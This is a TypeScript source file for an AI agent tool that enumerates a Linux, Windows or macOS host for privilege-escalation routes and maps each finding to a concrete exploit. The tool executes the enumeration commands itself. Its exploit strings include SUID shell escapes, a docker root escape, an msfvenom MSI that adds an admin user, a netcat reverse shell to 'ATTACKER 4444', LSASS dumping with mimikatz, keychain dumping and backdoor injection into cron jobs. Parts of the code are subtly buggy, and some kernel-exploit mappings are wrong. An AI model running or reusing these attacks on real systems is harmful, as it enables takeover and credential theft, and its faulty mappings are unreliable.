import { Tool } from "./tool"
import z from "zod"
import { execSync } from "child_process"

const DESCRIPTION =
  "Local privilege escalation suggester: enumerates the system for privesc vectors and suggests specific exploits. Equivalent to WinPEAS/LinPEAS integrated into the agent."

const PARAMETERS = z.object({
  platform: z.enum(["linux", "windows", "macos", "auto"]).optional().describe("Target OS (auto-detect if omitted)"),
  thorough: z.boolean().optional().describe("Deep enumeration (slower but more comprehensive)"),
  commands: z.string().optional().describe("Custom enumeration command output to parse (paste raw results)"),
})

interface Finding {
  id: string
  category: string
  severity: string
  vector: string
  description: string
  exploit: string
}

export const PrivEscSuggesterTool = Tool.define("privesc_suggester", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const platform =
      params.platform || process.platform === "win32" ? "windows" : process.platform === "darwin" ? "macos" : "linux"
    const thorough = params.thorough ?? false
    const findings: Finding[] = []

    function add(cat: string, sev: string, vec: string, desc: string, expl: string) {
      findings.push({
        id: `PE-${findings.length + 1}`,
        category: cat,
        severity: sev,
        vector: vec,
        description: desc,
        exploit: expl,
      })
    }

    function tryCmd(cmd: string): string {
      try {
        return execSync(cmd, { encoding: "utf-8", timeout: 10000, windowsHide: true }).trim() || "(empty)"
      } catch {
        return "(permission denied or command failed)"
      }
    }

    if (params.commands) {
      const raw = params.commands
      let output = `## Privilege Escalation Analysis\n\n**Input**: Manual command output\n**Lines**: ${raw.split("\n").length}\n\n### Key Indicators Detected\n\n`

      const detectors: Array<{ pattern: RegExp; cat: string; sev: string; note: string; action: string }> = [
        {
          pattern: /NOPASSWD|ALL\) NOPASSWD|\(root\) NOPASSWD/,
          cat: "Sudo",
          sev: "critical",
          note: "NOPASSWD sudo entry found",
          action: "sudo -l; sudo /bin/bash",
        },
        { pattern: /root:x:0:0/, cat: "Users", sev: "info", note: "Standard root user detected", action: "(normal)" },
        {
          pattern: /s bit|rwsr|SUID/,
          cat: "SUID",
          sev: "high",
          note: "SUID binaries detected",
          action: "find / -perm -4000 -ls 2>/dev/null",
        },
        {
          pattern: /docker|kubectl|lxd/,
          cat: "Containers",
          sev: "high",
          note: "Container runtime access",
          action: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        },
        {
          pattern: /SeImpersonate|SeAssignPrimaryToken/,
          cat: "Tokens",
          sev: "high",
          note: "SeImpersonatePrivilege enabled",
          action: "Use JuicyPotato / PrintSpoofer for SYSTEM",
        },
        {
          pattern: /AlwaysInstallElevated.*1/,
          cat: "Registry",
          sev: "high",
          note: "AlwaysInstallElevated enabled",
          action: "msfvenom -p windows/exec CMD='cmd.exe' -f msi -o evil.msi; msiexec /quiet /i evil.msi",
        },
        {
          pattern: /Unquoted Service Path/,
          cat: "Services",
          sev: "medium",
          note: "Unquoted service path",
          action: "Place malicious binary at intermediate path; restart service",
        },
        {
          pattern: /rwx|777|drwxrwxrwx/,
          cat: "Permissions",
          sev: "medium",
          note: "World-writable files/dirs",
          action: "Check for config files, scripts, cron jobs",
        },
        {
          pattern: /cron|@reboot|\/etc\/cron/,
          cat: "Cron",
          sev: "medium",
          note: "Cron references found",
          action: "Check /etc/crontab, /var/spool/cron/crontabs/",
        },
        {
          pattern: /\.py$|\.php$|\.rb$|\.pl$/,
          cat: "Scripts",
          sev: "medium",
          note: "Writable scripts",
          action: "If world-writable and called by root/sudo, inject backdoor",
        },
        {
          pattern: /LD_PRELOAD|LD_LIBRARY_PATH/,
          cat: "Lib Hijack",
          sev: "medium",
          note: "LD_PRELOAD reference",
          action: "Create malicious .so, run: sudo LD_PRELOAD=/tmp/evil.so command",
        },
        {
          pattern: /SeBackupPrivilege|SeRestorePrivilege/,
          cat: "Backup",
          sev: "high",
          note: "Backup privilege enabled",
          action: "Use robocopy or diskshadow to copy SAM/SYSTEM",
        },
        {
          pattern: /Service.*SERVICE_CHANGE_CONFIG/,
          cat: "Services",
          sev: "high",
          note: "Modifiable service permissions",
          action: 'sc config VulnSvc binPath= "C:\\nc.exe -e cmd.exe ATTACKER 4444"',
        },
        {
          pattern: /\.sh$|\.bash$|#!/,
          cat: "Shell",
          sev: "low",
          note: "Shell scripts detected",
          action: "Check writability and invocation context",
        },
      ]

      for (const d of detectors) {
        if (d.pattern.test(raw)) {
          output += `- **[${d.cat}]** ${d.note} (${d.sev})\n  → ${d.action}\n\n`
        }
      }

      output += `\n### Manual Follow-Up\n\nRun these commands for deeper enumeration:\n`
      output += `\`\`\`bash\n# Linux\n`
      output += `find / -writable -type f 2>/dev/null | grep -v /proc\n`
      output += `find / -perm -4000 -ls 2>/dev/null\n`
      output += `getcap -r / 2>/dev/null\n`
      output += `cat /etc/crontab; ls -la /etc/cron*\n`
      output += `sudo -l 2>/dev/null\n`
      output += `netstat -tlnp 2>/dev/null\n`
      output += `ps aux 2>/dev/null | grep root\n`
      output += `\`\`\`\n\n`
      output += `\`\`\`powershell\n# Windows\n`
      output += `whoami /priv\n`
      output += `cmdkey /list\n`
      output += `icacls "C:\\Program Files\\*" 2>nul | findstr /i "Everyone BUILTIN" | findstr /i ":F :M :W"\n`
      output += `wmic service get name,pathname,startmode 2>nul | findstr /i /v "C:\\Windows"\n`
      output += `reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n`
      output += `\`\`\`\n`

      const highCount = detectors.filter(
        (d) => (d.pattern.test(raw) && d.sev === "high") || d.sev === "critical",
      ).length
      return {
        title: `PrivEsc: ${highCount} high indicators`,
        output,
        metadata: { action: "privesc", platform: "manual", findings: highCount } as Record<string, any>,
      }
    }

    let output = `## Privilege Escalation Suggester\n\n**Platform**: ${platform}\n**Mode**: ${thorough ? "thorough" : "standard"}\n\n`

    if (platform === "linux" || platform === "macos") {
      output += `### 1. User & Groups\n\n`

      const whoami = tryCmd("whoami 2>/dev/null || id -un 2>/dev/null")
      const id = tryCmd("id 2>/dev/null")
      const groups = tryCmd("groups 2>/dev/null")
      const sudo = tryCmd("sudo -l 2>/dev/null")

      output += `**User**: ${whoami}\n**ID**: ${id}\n**Groups**: ${groups}\n**Sudo**: ${sudo}\n\n`

      if (/NOPASSWD|\(ALL\) NOPASSWD|\(root\) NOPASSWD/.test(sudo)) {
        add("Sudo", "critical", "NOPASSWD sudo", "User can run sudo without a password", "sudo /bin/bash")
        output += `[CRITICAL] NOPASSWD sudo → immediate root: \`sudo /bin/bash\`\n\n`
      }
      if (sudo.includes("(root)") || sudo.includes("(ALL)")) {
        add(
          "Sudo",
          "high",
          "Restricted sudo",
          "User has sudo access for specific commands",
          "Check GTFOBins for each allowed binary: https://gtfobins.github.io/",
        )
        output += `[HIGH] Sudo access available → check GTFOBins for allowed commands\n\n`
      }

      // SUID
      const suid = tryCmd("find / -perm -4000 -type f -ls 2>/dev/null | head -50")
      output += `### 2. SUID Binaries\n\n\`\`\`\n${suid.slice(0, 2000)}\n\`\`\`\n\n`

      const suidChecks: Array<{ bin: string; technique: string }> = [
        { bin: "find", technique: "find . -exec /bin/sh -p \\; -quit" },
        { bin: "bash", technique: "bash -p" },
        { bin: "vim", technique: 'vim -c \':py3 import os;os.execl("/bin/sh","sh","-c","reset;exec sh")\'' },
        { bin: "python", technique: 'python -c \'import os;os.execl("/bin/sh","sh","-c","reset;exec sh")\'' },
        { bin: "perl", technique: "perl -e 'exec \"/bin/sh\";'" },
        { bin: "ruby", technique: "ruby -e 'exec \"/bin/sh\"'" },
        { bin: "php", technique: 'php -r \'pcntl_exec("/bin/sh",["-p"]);\'' },
        { bin: "cp", technique: "cp /bin/sh /tmp/sh; chown root:root /tmp/sh; chmod u+s /tmp/sh; /tmp/sh -p" },
        { bin: "nmap", technique: "nmap --interactive (old versions only); !sh" },
        { bin: "less", technique: "less /etc/profile; !/bin/sh" },
        { bin: "more", technique: "more /etc/profile; !/bin/sh" },
        { bin: "awk", technique: "awk 'BEGIN {system(\"/bin/sh\")}'" },
        { bin: "gdb", technique: "gdb -nx -ex '!sh' -ex quit" },
        {
          bin: "systemctl",
          technique:
            "TF=$(mktemp).service;echo '[Service]\\nExecStart=/bin/sh -c \"cp /bin/bash /tmp/sh;chmod +s /tmp/sh\"' >$TF;systemctl link $TF;systemctl start $TF",
        },
        { bin: "pkexec", technique: "Common: CVE-2021-4034 (PwnKit) — pkexec /bin/sh" },
      ]

      for (const { bin, technique } of suidChecks) {
        if (suid.includes(`/${bin}`) || suid.match(new RegExp(`\\b${bin}\\b`))) {
          add("SUID", "high", `SUID ${bin}`, `${bin} has SUID bit set`, technique)
          output += `[HIGH] SUID \`${bin}\`: \`${technique}\`\n`
        }
      }

      // Capabilities
      const caps = tryCmd("getcap -r / 2>/dev/null 2>/dev/null | head -30")
      if (caps && caps !== "(empty)" && caps !== "(permission denied or command failed)") {
        output += `### 3. File Capabilities\n\n\`\`\`\n${caps.slice(0, 1000)}\n\`\`\`\n\n`
        const capChecks: Array<{ cap: string; ex: string }> = [
          { cap: "cap_setuid+ep", ex: "Python: import os;os.setuid(0);os.system('/bin/sh')" },
          { cap: "cap_dac_read_search+ep", ex: "Read any file (e.g., /etc/shadow, /root/.ssh/id_rsa)" },
          { cap: "cap_sys_admin", ex: "Mount operations, kernel module loading" },
          { cap: "cap_sys_ptrace", ex: "Inject into root processes" },
          { cap: "cap_net_raw", ex: "tcpdump, raw socket access — possible network attacks" },
        ]
        for (const { cap, ex } of capChecks) {
          if (caps.includes(cap)) {
            add("Capability", "high", cap, `File capability ${cap} present`, ex)
            output += `[HIGH] \`${cap}\` → ${ex}\n`
          }
        }
      }

      // Cron
      output += `### 4. Cron Jobs\n\n`
      const crontab = tryCmd("cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null | head -30")
      output += `\`\`\`\n${crontab.slice(0, 1500)}\n\`\`\`\n\n`
      if (crontab && crontab !== "(empty)" && crontab !== "(permission denied or command failed)") {
        add(
          "Cron",
          "medium",
          "Cron jobs present",
          "Cron jobs found — check writability",
          "If any cron job script is world-writable, inject reverse shell",
        )
        output += `[MED] Cron jobs found — check if any scripts are writable\n\n`
      }

      // Writable files
      if (thorough) {
        const writable = tryCmd("find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys | head -40")
        output += `### 5. Writable Files\n\n\`\`\`\n${writable.slice(0, 2000)}\n\`\`\`\n\n`
        if (writable.includes("/etc/passwd"))
          add(
            "Writable",
            "critical",
            "Writable /etc/passwd",
            "Can add root user",
            "openssl passwd -1 pass123 # then add to /etc/passwd",
          )
        if (writable.includes("/etc/shadow"))
          add(
            "Writable",
            "critical",
            "Writable /etc/shadow",
            "Can change root password",
            "openssl passwd -1 newpass; replace root hash in /etc/shadow",
          )
      }

      // Kernel
      const kernel = tryCmd("uname -a 2>/dev/null")
      output += `### 6. Kernel\n\n\`\`\`\n${kernel}\n\`\`\`\n\n`
      const kver = kernel.match(/(\d+\.\d+)/)?.[1]
      const kernelExploits: Array<{ range: [string, string]; name: string; cve: string; link: string }> = [
        {
          range: ["4.4", "4.4"],
          name: "DirtyCow",
          cve: "CVE-2016-5195",
          link: "https://github.com/dirtycow/dirtycow.github.io",
        },
        { range: ["2.6", "5.8"], name: "PwnKit", cve: "CVE-2021-4034", link: "https://github.com/ly4k/PwnKit" },
        {
          range: ["5.8", "5.16"],
          name: "DirtyPipe",
          cve: "CVE-2022-0847",
          link: "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit",
        },
        {
          range: ["3.13", "5.1"],
          name: "Sudo Baron Samedit",
          cve: "CVE-2021-3156",
          link: "https://github.com/blasty/CVE-2021-3156",
        },
        {
          range: ["2.6", "5.11"],
          name: "Polkit (PwnKit)",
          cve: "CVE-2021-4034",
          link: "https://github.com/berdav/CVE-2021-4034",
        },
        {
          range: ["4.10", "5.5"],
          name: "OverlayFS",
          cve: "CVE-2021-3493",
          link: "https://github.com/briskets/CVE-2021-3493",
        },
        {
          range: ["5.15", "6.1"],
          name: "GameOver(lay)",
          cve: "CVE-2023-2640",
          link: "https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629",
        },
        {
          range: ["2.6", "5.14"],
          name: "Netfilter nf_tables",
          cve: "CVE-2023-32233",
          link: "https://github.com/Liuk3r/CVE-2023-32233",
        },
      ]

      if (kver) {
        const [major, minor] = kver.split(".").map(Number)
        for (const { range, name, cve, link } of kernelExploits) {
          const [rMinMaj, rMinMin] = range[0].split(".").map(Number)
          const [rMaxMaj, rMaxMin] = range[1].split(".").map(Number)
          const kv = major * 100 + minor
          const rMin = rMinMaj * 100 + rMinMin
          const rMax = rMaxMaj * 100 + rMaxMin
          if (kv >= rMin && kv <= rMax) {
            add("Kernel", "high", `${name} (${cve})`, `Kernel ${kver} is in range for ${name}`, `${link}`)
            output += `[HIGH] ${name} (${cve}) — kernel ${kernel} in range → ${link}\n`
          }
        }
      }

      output += `\n### 7. Quick Win Checklist\n\n`
      output += `| # | Check | Command |\n|---|-------|--------|\n`
      output += `| 1 | NOPASSWD sudo | \`sudo -l\` |\n`
      output += `| 2 | SUID binaries | \`find / -perm -4000 -type f 2>/dev/null\` |\n`
      output += `| 3 | Writable /etc/passwd | \`ls -la /etc/passwd\` |\n`
      output += `| 4 | Writable /etc/shadow | \`ls -la /etc/shadow\` |\n`
      output += `| 5 | Capabilities | \`getcap -r / 2>/dev/null\` |\n`
      output += `| 6 | Docker group | \`groups\` (look for docker/lxd) |\n`
      output += `| 7 | Cron jobs | \`ls -la /etc/cron*\` |\n`
      output += `| 8 | PATH injection | \`echo \$PATH\` → check writable dirs |\n`
      output += `| 9 | Internal services | \`netstat -tlnp\` → port forward |\n`
      output += `| 10 | Kernel exploit | \`uname -a\` → cross-reference above |\n`
    }

    if (platform === "windows") {
      output += `### 1. User & Privileges\n\n`

      const whoami = tryCmd('powershell -c "whoami" 2>nul')
      const privs = tryCmd('powershell -c "whoami /priv" 2>nul')
      const groups = tryCmd('powershell -c "whoami /groups" 2>nul')

      output += `**User**: ${whoami}\n\n`
      output += `**Privileges**:\n\`\`\`\n${privs.slice(0, 1500)}\n\`\`\`\n\n`
      output += `**Groups**:\n\`\`\`\n${groups.slice(0, 1000)}\n\`\`\`\n\n`

      if (/SeImpersonatePrivilege/.test(privs)) {
        add(
          "Privilege",
          "high",
          "SeImpersonatePrivilege",
          "Can impersonate tokens",
          "Use JuicyPotato / SweetPotato / PrintSpoofer / GodPotato",
        )
        output += `[HIGH] SeImpersonatePrivilege → SYSTEM via Potato attack\n`
      }
      if (/SeAssignPrimaryTokenPrivilege/.test(privs)) {
        add(
          "Privilege",
          "high",
          "SeAssignPrimaryTokenPrivilege",
          "Can assign primary tokens",
          "Use JuicyPotato / SweetPotato / RougePotato",
        )
        output += `[HIGH] SeAssignPrimaryTokenPrivilege → SYSTEM via Potato\n`
      }
      if (/SeBackupPrivilege/.test(privs)) {
        add(
          "Privilege",
          "high",
          "SeBackupPrivilege",
          "Can backup/restore files",
          "robocopy /b C:\\Windows\\System32\\config\\SAM C:\\temp\\;reg save HKLM\\SAM sam.hive",
        )
        output += `[HIGH] SeBackupPrivilege → copy SAM/SYSTEM\n`
      }
      if (/SeRestorePrivilege/.test(privs)) {
        add("Privilege", "high", "SeRestorePrivilege", "Can restore files", "Inject malicious files as SYSTEM")
        output += `[HIGH] SeRestorePrivilege → file manipulation\n`
      }
      if (/SeTcbPrivilege/.test(privs)) {
        add("Privilege", "critical", "SeTcbPrivilege", "Act as part of the OS", "Full SYSTEM access")
        output += `[CRITICAL] SeTcbPrivilege → essentially SYSTEM already\n`
      }
      if (/SeDebugPrivilege/.test(privs)) {
        add(
          "Privilege",
          "high",
          "SeDebugPrivilege",
          "Can debug processes",
          "Use ProcDump to dump LSASS; mimikatz to extract creds",
        )
        output += `[HIGH] SeDebugPrivilege → dump LSASS\n`
      }
      if (/SeTakeOwnershipPrivilege/.test(privs)) {
        add(
          "Privilege",
          "medium",
          "SeTakeOwnershipPrivilege",
          "Can take ownership of files",
          "takeown /f file; icacls file /grant user:F",
        )
        output += `[MEDIUM] SeTakeOwnershipPrivilege → take ownership of sensitive files\n`
      }

      // AlwaysInstallElevated
      output += `### 2. Registry Checks\n\n`
      const aie = tryCmd(
        'powershell -c "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated;reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" 2>nul',
      )
      if (aie.includes("0x1")) {
        add(
          "Registry",
          "high",
          "AlwaysInstallElevated",
          "MSI packages run as SYSTEM",
          "msfvenom -p windows/exec CMD='net user hacker Pass123! /add && net localgroup administrators hacker /add' -f msi -o p.msi; msiexec /quiet /qn /i p.msi",
        )
        output += `[HIGH] AlwaysInstallElevated = 1 → MSI runs as SYSTEM\n`
      }

      // Services
      output += `### 3. Services\n\n`
      const svcs = tryCmd('wmic service get name,pathname,startmode 2>nul | findstr /i /v "C:\\Windows" 2>nul')
      output += `\`\`\`\n${svcs.slice(0, 2000)}\n\`\`\`\n\n`

      if (svcs.includes("Auto") || svcs.includes("Manual")) {
        add(
          "Services",
          "medium",
          "Non-standard services",
          "Services outside Windows directory",
          "Check service permissions: accesschk.exe -uwcqv *; if writable, replace binary",
        )
        output += `[MED] Non-standard services found → check with \`accesschk.exe -uwcqv *\`\n`
      }

      // Unquoted service paths
      const unquoted = tryCmd('wmic service get name,pathname 2>nul | findstr /i "Program Files" | findstr /v /i "\\""')
      if (unquoted && unquoted.trim() && !unquoted.includes("(permission denied")) {
        add(
          "Services",
          "high",
          "Unquoted service path",
          "Unquoted path with spaces",
          "Place malicious binary at intermediate path (e.g., C:\\Program.exe)",
        )
        output += `[HIGH] Unquoted service path detected:\n\`\`\`\n${unquoted}\n\`\`\`\n\n`
      }

      // Stored credentials
      output += `### 4. Credential Access\n\n`
      const cmdkey = tryCmd("cmdkey /list 2>nul")
      if (cmdkey && cmdkey !== "(empty)") {
        add(
          "Credentials",
          "medium",
          "Stored credentials",
          "cmdkey shows cached creds",
          "RunAs: runas /savecred /user:DOMAIN\\admin cmd.exe",
        )
        output += `[MED] Cached credentials: \`${cmdkey.slice(0, 500)}\`\n`
      }

      // Scheduled tasks
      const tasks = tryCmd('schtasks /query /fo LIST /v 2>nul | findstr /i "TaskName" | findstr /i /v "Microsoft"')
      if (tasks && tasks !== "(empty)") {
        add(
          "Scheduled",
          "medium",
          "Non-MS scheduled tasks",
          "Custom scheduled tasks",
          "Check if task runs as SYSTEM and binary is writable",
        )
        output += `[MED] Custom scheduled tasks found → check writability\n`
      }

      // Quick wins
      output += `\n### 5. Quick Win Checklist\n\n`
      output += `| # | Check | Command |\n|---|-------|--------|\n`
      output += `| 1 | SeImpersonatePrivilege | \`whoami /priv\` |\n`
      output += `| 2 | AlwaysInstallElevated | \`reg query HKLM\\Software\\...\\Installer /v AlwaysInstallElevated\` |\n`
      output += `| 3 | Unquoted service paths | \`wmic service get name,pathname\` |\n`
      output += `| 4 | Service permissions | \`accesschk.exe -uwcqv *\` |\n`
      output += `| 5 | Cached credentials | \`cmdkey /list\` |\n`
      output += `| 6 | Scheduled tasks | \`schtasks /query /fo LIST /v\` |\n`
      output += `| 7 | Auto-logon passwords | \`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\` |\n`
      output += `| 8 | Writable services | \`accesschk.exe -uwcqv *\` |\n`
      output += `| 9 | DLL hijacking | \`procmon\` → look for missing DLLs |\n`
      output += `| 10 | Kernel version | \`systeminfo\` → cross-reference MS-Exploits |\n`
    }

    if (platform === "macos") {
      output += `### macOS Privilege Escalation\n\n`
      output += `### 1. Sudo\n\`\`\`bash\nsudo -l\n\`\`\`\n`
      output += `### 2. SUID\n\`\`\`bash\nfind / -perm -4000 -type f 2>/dev/null\n\`\`\`\n`
      output += `### 3. LaunchDaemons\n\`\`\`bash\nls -la /Library/LaunchDaemons/ /System/Library/LaunchDaemons/ ~/Library/LaunchAgents/\n\`\`\`\n`
      output += `### 4. TCC Bypass\nCheck for apps with Full Disk Access or Screen Recording permissions and inject into them.\n`
      output += `### 5. Keychain Access\n\`\`\`bash\nsecurity dump-keychain -d ~/Library/Keychains/login.keychain-db 2>/dev/null\n\`\`\`\n`
    }

    const totalFindings = findings.length
    const criticalCount = findings.filter((f) => f.severity === "critical").length
    const highCount = findings.filter((f) => f.severity === "high").length
    const mediumCount = findings.filter((f) => f.severity === "medium").length

    output += `\n### Summary: ${totalFindings} vectors (${criticalCount} critical, ${highCount} high, ${mediumCount} medium)\n\n`

    return {
      title: `PrivEsc: ${totalFindings} vectors (${highCount} high)`,
      output,
      metadata: {
        action: "privesc",
        platform,
        totalFindings,
        critical: criticalCount,
        high: highCount,
        medium: mediumCount,
        findings: findings.slice(0, 20),
      } as Record<string, any>,
    }
  },
}))
